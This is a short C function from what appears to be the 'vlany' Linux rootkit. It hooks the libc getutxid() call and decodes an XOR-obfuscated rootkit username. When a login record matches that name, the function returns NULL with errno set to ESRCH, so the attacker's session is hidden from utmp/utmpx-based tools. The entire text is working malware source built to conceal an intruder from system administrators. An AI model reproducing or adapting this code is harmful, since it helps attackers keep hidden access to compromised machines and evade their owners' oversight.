struct utmpx *getutxid(const struct utmpx *utx)
{
    #ifdef DEBUG
        printf("[vlany] getutxid() called\n");
    #endif

    HOOK(old_getutxid, CGETUTXID);

    struct utmpx *tmp = old_getutxid(utx);

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user)) { CLEAN(vlany_user); errno = ESRCH; return NULL; }
        CLEAN(vlany_user);
    }

    return old_getutxid(utx);
}
